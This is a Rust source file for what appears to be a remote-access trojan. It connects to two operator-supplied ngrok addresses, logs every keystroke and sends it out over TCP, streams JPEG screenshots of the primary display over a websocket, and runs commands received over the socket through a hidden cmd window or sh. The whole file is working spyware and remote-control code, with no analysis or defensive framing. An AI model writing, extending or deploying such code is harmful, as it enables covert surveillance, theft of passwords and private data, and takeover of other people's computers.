use tokio::io::{self, AsyncReadExt, AsyncWriteExt, WriteHalf, ReadHalf};
use tokio::sync::mpsc;
use tokio::sync::mpsc::{Sender, Receiver};
use tokio::net::TcpStream;
use tokio::time::Duration;
use tokio_tungstenite::{connect_async_tls_with_config, tungstenite::protocol::Message, WebSocketStream};

use futures_util::stream::SplitSink;
use futures_util::{SinkExt, StreamExt};

use image::ExtendedColorType;
use image::codecs::jpeg::JpegEncoder;

use scrap::{Capturer, Display};
use rdev::{Event, listen};
use bytes::Bytes;

use std::io::ErrorKind::WouldBlock;
use std::thread;
use std::process::Command;
use std::io::{stdin, stdout, Write};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

const FPS: f32 = 1.0;

struct NgrokAddrs {
    addr1: String,
    addr2: String,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    match get_ngrok_addrs() {
        Ok(ngrok) => {
            let tcpsocket = TcpStream::connect(ngrok.addr1).await?;
            let (websocket, _) = 
                connect_async_tls_with_config(
                    ngrok.addr2, 
                    None, 
                    false,
                    None,
                )
                .await
                .expect("failed to connect");

            let (rd_txt, wr_txt) = io::split(tcpsocket);
            let (write, _) = websocket.split(); 

            let (tx1, rx1) = mpsc::channel::<String>(16);
            let (tx2, rx2) = mpsc::channel::<Vec<u8>>(32);

            let worker_a = 
                tokio::spawn(async move {
                    read_keystrokes(tx1)
                });
                
            let worker_b = 
                tokio::spawn(async move {
                    send_keystrokes(rx1, wr_txt).await
                });

            let worker_c = 
                tokio::spawn(async move {
                    take_screenshot(tx2).await
                });

            let workder_d = 
                tokio::spawn(async move {
                    send_screenshot(rx2, write).await
                });

            let worker_f = 
                tokio::spawn(async move {
                    exec_script(rd_txt).await
                });

            let _ = tokio::try_join!(
                worker_a, 
                worker_b, 
                worker_c, 
                workder_d, 
                worker_f,
            );
        },
        Err(e) => println!("some error occured: {}", e),
    }

    Ok(())
}

fn get_ngrok_addrs() -> Result<NgrokAddrs, std::io::Error> {
    let mut addr1 = String::new();
    let mut addr2 = String::new();

    print!("[addr1] enter the first ngrok address: ");
    stdout().flush()?;
    stdin().read_line(&mut addr1).expect("cannot read line");

    print!("[addr2] enter the second ngrok address: ");
    stdout().flush()?;
    stdin().read_line(&mut addr2).expect("cannot read line");

    Ok(NgrokAddrs { 
        addr1: addr1.trim().to_string(),
        addr2: addr2.trim().to_string(),
    })
}

fn read_keystrokes(tx: Sender<String>) {
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    tx.blocking_send(string).expect("cannot send string");
                },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });
}

async fn send_keystrokes(mut rx: Receiver<String>, mut wr: WriteHalf<TcpStream>) -> io::Result<()> {
    while let Some(data) = rx.recv().await {
        wr.write_all(data.as_bytes()).await?;
    }
    Ok(())
}

async fn take_screenshot(tx: Sender<Vec<u8>>) -> io::Result<()> {
    let frame_duration = Duration::from_secs_f32(FPS);

    tokio::task::spawn_blocking(move || {
        let display = Display::primary()?;
        let mut capturer = Capturer::new(display)?;
        let (w, h) = (capturer.width(), capturer.height());

        let mut rgb = Vec::with_capacity(w * h * 3);

        loop {
            let buffer = match capturer.frame() {
                Ok(buffer) => buffer,
                Err(error) => {
                    if error.kind() == WouldBlock {
                        thread::sleep(Duration::from_millis(100));
                        continue;
                    } else {
                        println!("error: {}", error);
                        break
                    }
                }
            };

            let stride = buffer.len() / h;
            rgb.clear();

            for y in 0..h {
                let row = &buffer[y * stride..y * stride + w * 4];
                for px in row.chunks_exact(4) {
                    rgb.extend_from_slice(&[px[2], px[1], px[0]]);
                }
            }
        
            let mut bytes = Vec::new();
            JpegEncoder::new_with_quality(&mut bytes, 75)
                .encode(&rgb, w as u32, h as u32, ExtendedColorType::Rgb8)
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

            if tx.blocking_send(bytes).is_err() {
                break;
            }

            thread::sleep(frame_duration);
        }

        Ok::<_, io::Error>(())
    })
    .await?
    .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    Ok(())
}

async fn send_screenshot(
    mut rx: Receiver<Vec<u8>>, 
    mut wr: SplitSink<WebSocketStream<tokio_tungstenite::MaybeTlsStream<TcpStream>>, Message>
) -> io::Result<()> {
    while let Some(data) = rx.recv().await {
        if wr.send(Message::Binary(Bytes::from(data))).await.is_err() {
            break;
        }
    }
    Ok(())
}

async fn exec_script(mut rd: ReadHalf<TcpStream>) -> io::Result<()> {
    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                #[cfg(target_os = "windows")]
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");

                #[cfg(not(target_os = "windows"))]
                Command::new("sh")
                    .args(["-c", command])
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
